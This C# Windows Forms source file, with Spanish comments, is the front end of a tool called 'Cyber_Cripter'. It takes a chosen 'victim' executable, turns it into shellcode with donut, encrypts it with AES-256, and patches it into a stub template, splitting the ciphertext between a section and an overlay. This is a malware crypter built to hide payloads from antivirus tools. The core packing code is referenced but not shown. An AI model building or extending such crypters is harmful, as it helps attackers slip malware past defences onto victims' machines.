using System;
using System.IO;
using System.Windows.Forms;

namespace Cyber_Cripter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void browseFile_Click(object sender, EventArgs e)
        {
            using (var dlg = new OpenFileDialog { Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*" })
            {
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    fileRoute.Text = dlg.FileName;
                    statusLabel.Text = "";
                }
            }
        }

        private void encryptBtn_Click(object sender, EventArgs e)
        {
            // Validar que el usuario ha seleccionado un .exe válido
            string inputPath = fileRoute.Text;
            if (string.IsNullOrWhiteSpace(inputPath) || !File.Exists(inputPath)
                || inputPath == "File to encrypt path")
            {
                Show("Select a valid input executable first.", error: true);
                return;
            }

            // Verificar que el stub template existe (generado con stub\build.bat)
            string appDir       = AppDomain.CurrentDomain.BaseDirectory;
            string templatePath = Path.Combine(appDir, "Resources", "stub_template.exe");
            if (!File.Exists(templatePath))
            {
                Show("stub_template.exe not found at:\n" + templatePath +
                     "\nBuild it via stub\\build.bat (checkout building instructions in stub\\README.md).", error: true);
                return;
            }

            // Obtener ruta de salida: outputs/<nombre_input>_crypted.exe
            string outputDir  = Path.Combine(appDir, "outputs");
            string outputName = Path.GetFileNameWithoutExtension(inputPath) + "_crypted.exe";
            string outputPath = Path.Combine(outputDir, outputName);

            // Deshabilitar el botón mientras se procesa para evitar dobles clics
            encryptBtn.Enabled = false;
            Show("Converting payload to shellcode (donut)...");

            try
            {
                // Paso 1: convertir el .exe víctima a shellcode PIC mediante donut.exe
                byte[] shellcode = Donut.Convert(inputPath);
                Show("Shellcode generated (" + shellcode.Length + " B). Encrypting & patching stub...");

                // Paso 2: cifrar el shellcode con AES-256 y parchearlo dentro del stub template
                    // StubBuilder genera la clave derivada, escribe los metadatos (IV, timestamp,
                    // heap_marker) en la sección .cdata del stub, y guarda el fichero final en outputPath
                byte[] stubTemplate = File.ReadAllBytes(templatePath);
                var report = StubBuilder.Build(stubTemplate, shellcode, outputPath);

                // Mostrar resumen del build: tamaños, distribución half1/half2, clave derivada
                Show(string.Format(
                    "Done.\n" +
                    "  Output path:      {0}\n" +
                    "  Shellcode:   {1} B  ->  Ciphertext: {2} B\n" +
                    "  Embedded:    {3} B (.cdata)   Overlay: {4} B\n" +
                    "  Build ts:    {5}\n" +
                    "  Derived key: {6}",
                    report.OutputPath, report.ShellcodeBytes, report.CiphertextBytes,
                    report.Half1Bytes, report.Half2Bytes, report.Timestamp, report.KeyHex));
            }
            catch (Exception ex)
            {
                Show("Failed: " + ex.Message, error: true);
            }
            finally
            {
                // Reactivar el botón siempre, tanto si ha habido error como si no
                encryptBtn.Enabled = true;
            }
        }

        // Muestra mensaje por consola (statusLabel)
        private void Show(string msg, bool error = false)
        {
            statusLabel.ForeColor = error
                ? System.Drawing.Color.IndianRed
                : System.Drawing.Color.LightGreen;
            statusLabel.Text = msg;
            statusLabel.Refresh();
        }
    }
}
